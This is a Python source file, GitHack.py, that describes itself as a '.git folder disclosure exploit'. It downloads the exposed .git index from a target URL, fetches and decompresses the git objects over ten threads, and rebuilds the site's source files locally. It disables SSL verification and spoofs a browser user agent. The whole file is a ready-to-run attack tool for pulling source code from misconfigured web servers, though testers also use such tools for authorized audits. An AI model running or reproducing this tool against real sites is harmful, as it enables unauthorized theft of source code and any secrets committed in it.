#!/usr/bin/env python
# -*- encoding: utf-8 -*-

import sys
try:
    # python 2.x
    import urllib2
    import urlparse
    import Queue
except Exception as e:
    # python 3.x
    import urllib.request as urllib2
    import urllib.parse as urlparse
    import queue as Queue

import os
import zlib
import threading
import re
import time
from lib.parser import parse
import ssl

context = ssl._create_unverified_context()
user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) ' \
             'Chrome/99.0.4844.82 Safari/537.36'
if len(sys.argv) == 1:
    msg = """
A `.git` folder disclosure exploit. By LiJieJie

Usage: python GitHack.py http://www.target.com/.git/
"""
    print(msg)
    sys.exit(0)


class Scanner(object):
    def __init__(self):
        self.base_url = sys.argv[-1]
        self.domain = urlparse.urlparse(sys.argv[-1]).netloc.replace(':', '_')
        print('[+] Download and parse index file ...')
        try:
            data = self._request_data(sys.argv[-1] + '/index')
        except Exception as e:
            print('[ERROR] index file download failed: %s' % str(e))
            exit(-1)
        with open('index', 'wb') as f:
            f.write(data)
        if not os.path.exists(self.domain):
            os.mkdir(self.domain)
        self.queue = Queue.Queue()
        for entry in parse('index'):
            if "sha1" in entry.keys():
                if entry["name"].strip().find('..') < 0:
                    self.queue.put((entry["sha1"].strip(), entry["name"].strip()))
                try:
                    print('[+] %s' % entry['name'])
                except Exception as e:
                    pass
        self.lock = threading.Lock()
        self.thread_count = 10
        self.STOP_ME = False

    @staticmethod
    def _request_data(url):
        request = urllib2.Request(url, None, {'User-Agent': user_agent})
        return urllib2.urlopen(request, context=context).read()

    def _print(self, msg):
        self.lock.acquire()
        try:
            print(msg)
        except Exception as e:
            pass
        self.lock.release()

    def get_back_file(self):
        while not self.STOP_ME:
            try:
                sha1, file_name = self.queue.get(timeout=0.5)
            except Exception as e:
                break
            for i in range(3):
                try:
                    folder = '/objects/%s/' % sha1[:2]
                    data = self._request_data(self.base_url + folder + sha1[2:])
                    try:
                        data = zlib.decompress(data)
                    except:
                        self._print('[Error] Fail to decompress %s' % file_name)
                    # data = re.sub(r'blob \d+\00', '', data)
                    try:
                        data = re.sub(r'blob \d+\00', '', data)
                    except Exception as e:
                        data = re.sub(b"blob \\d+\00", b'', data)
                    target_dir = os.path.join(self.domain, os.path.dirname(file_name))
                    if target_dir and not os.path.exists(target_dir):
                        os.makedirs(target_dir)
                    with open(os.path.join(self.domain, file_name), 'wb') as f:
                        f.write(data)
                    self._print('[OK] %s' % file_name)
                    break
                except urllib2.HTTPError as e:
                    if str(e).find('HTTP Error 404') >= 0:
                        self._print('[File not found] %s' % file_name)
                        break
                except Exception as e:
                    self._print('[Error] %s' % str(e))
        self.exit_thread()

    def exit_thread(self):
        self.lock.acquire()
        self.thread_count -= 1
        self.lock.release()

    def scan(self):
        for i in range(self.thread_count):
            t = threading.Thread(target=self.get_back_file)
            t.start()


if __name__ == '__main__':
    s = Scanner()
    s.scan()
    try:
        while s.thread_count > 0:
            time.sleep(0.1)
    except KeyboardInterrupt as e:
        s.STOP_ME = True
        time.sleep(1.0)
        print('User Aborted.')
